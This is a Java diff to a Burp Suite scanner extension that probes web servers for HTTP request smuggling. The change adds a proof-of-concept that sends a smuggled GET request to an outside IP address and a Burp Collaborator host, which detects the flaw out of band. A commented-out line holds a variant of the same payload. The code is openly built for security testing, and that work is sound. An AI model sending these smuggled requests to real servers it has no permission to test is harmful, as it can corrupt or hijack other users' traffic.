@@ -96,11 +96,18 @@ public class SmuggleScan extends Scan implements IScannerCheck  {
     }
 
     boolean sendPoc(byte[] base, IHttpService service) {
+        boolean gpoc = sendPoc(base, service, "G", "G");
+        //boolean cpoc = sendPoc(base, service,"GET / HTTP/1.1\r\nHost: "+service.getHost()+".cvbzu8x774fh9miyfwvb30jgf7lx9m.burpcollaborator.net\r\n\r\n");
+        boolean cpoc = sendPoc(base, service, "collab", "GET /cvbzu8x774fh9miyfwvb30jgf7lx9m/"+service.getHost()+" HTTP/1.1\r\nHost: 52.16.21.24\r\n\r\n");
+        return gpoc || cpoc;
+    }
+
+    boolean sendPoc(byte[] base, IHttpService service, String name, String inject) {
         try {
             byte[] badMethodIfChunked = Utilities.setHeader(base, "Connection", "keep-alive");
-            badMethodIfChunked = bypassContentLengthFix(makeChunked(badMethodIfChunked, 1, 0));
+            badMethodIfChunked = bypassContentLengthFix(makeChunked(badMethodIfChunked, inject.length(), 0));
             SmuggleHelper helper = new SmuggleHelper(service);
-            helper.queue(Utilities.helpers.bytesToString(badMethodIfChunked) + "G");
+            helper.queue(Utilities.helpers.bytesToString(badMethodIfChunked) + inject);
             byte[] victim = makeChunked(base, 0, 0);
             helper.queue(Utilities.helpers.bytesToString(victim));
 
@@ -115,14 +122,15 @@ public class SmuggleScan extends Scan implements IScannerCheck  {
             }
 
             if (cleanupStatus == minerStatus) {
-                report("Req smuggling attack (legit)", "code1:code1:code2", cleanup, results.get(0), results.get(1));
+                report("Req smuggling attack (legit): "+name, "code1:code1:code2", cleanup, results.get(0), results.get(1));
             } else if (minerStatus == victimStatus) {
-                report("Req smuggling attack (risky)", "code1:code2:code2", cleanup, results.get(0), results.get(1));
+                report("Req smuggling attack (risky): "+name, "code1:code2:code2", cleanup, results.get(0), results.get(1));
             } else if (cleanupStatus == victimStatus) {
-                report("Probably nothing", "code1:code2:code1", cleanup, results.get(0), results.get(1));
+                report("Probably nothing: "+name, "code1:code2:code1", cleanup, results.get(0), results.get(1));
             } else {
-                report("Req smuggling attack (hazardous)", "code1:code2:code3", cleanup, results.get(0), results.get(1));
+                report("Req smuggling attack (hazardous): "+name, "code1:code2:code3", cleanup, results.get(0), results.get(1));
             }
+
             BurpExtender.hostsToSkip.putIfAbsent(service.getHost(), true);
             return true;
         }
